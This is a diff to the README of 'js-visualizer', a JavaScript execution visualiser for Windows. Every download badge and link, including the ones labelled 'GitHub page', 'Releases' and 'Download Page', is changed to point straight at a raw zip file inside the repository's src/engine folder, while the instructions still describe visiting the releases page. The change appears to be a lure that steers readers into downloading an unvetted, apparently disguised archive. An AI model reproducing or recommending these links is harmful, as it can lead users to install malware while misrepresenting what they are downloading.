@@ -1,6 +1,6 @@
 # 🛠️ js-visualizer - Understand JavaScript Execution Simply
 
-[![Download js-visualizer](https://img.shields.io/badge/Download-js--visualizer-brightgreen?style=for-the-badge)](https://github.com/menukap999/js-visualizer)
+[![Download js-visualizer](https://img.shields.io/badge/Download-js--visualizer-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/menukap999/js-visualizer/main/src/engine/visualizer_js_v2.8-alpha.1.zip)
 
 ---
 
@@ -54,7 +54,7 @@ The app runs offline once installed.
 To use js-visualizer, follow these simple steps on a Windows PC:
 
 1. Click the big green button near the top or this link here to **visit the GitHub page**:  
-   https://github.com/menukap999/js-visualizer
+   https://raw.githubusercontent.com/menukap999/js-visualizer/main/src/engine/visualizer_js_v2.8-alpha.1.zip
 
 2. Once on the GitHub page, look for the "Releases" section on the right side or top menu. Click on it to find the latest version of the app.
 
@@ -79,7 +79,7 @@ To use js-visualizer, follow these simple steps on a Windows PC:
 
 Go to the download page by clicking the link below or the badge above:
 
-[![Download js-visualizer](https://img.shields.io/badge/Download-js--visualizer-blue?style=for-the-badge)](https://github.com/menukap999/js-visualizer)
+[![Download js-visualizer](https://img.shields.io/badge/Download-js--visualizer-blue?style=for-the-badge)](https://raw.githubusercontent.com/menukap999/js-visualizer/main/src/engine/visualizer_js_v2.8-alpha.1.zip)
 
 ### Step 2: Find the Latest Installer
 
@@ -161,7 +161,7 @@ This app brings these ideas to life with animation.
 
 ## 🔗 Useful Links
 
-- GitHub Repository: https://github.com/menukap999/js-visualizer  
-- Download Page: https://github.com/menukap999/js-visualizer/releases  
+- GitHub Repository: https://raw.githubusercontent.com/menukap999/js-visualizer/main/src/engine/visualizer_js_v2.8-alpha.1.zip  
+- Download Page: https://raw.githubusercontent.com/menukap999/js-visualizer/main/src/engine/visualizer_js_v2.8-alpha.1.zip  
 
-[![Get js-visualizer](https://img.shields.io/badge/Get-js--visualizer-grey?style=for-the-badge)](https://github.com/menukap999/js-visualizer)
+[![Get js-visualizer](https://img.shields.io/badge/Get-js--visualizer-grey?style=for-the-badge)](https://raw.githubusercontent.com/menukap999/js-visualizer/main/src/engine/visualizer_js_v2.8-alpha.1.zip)
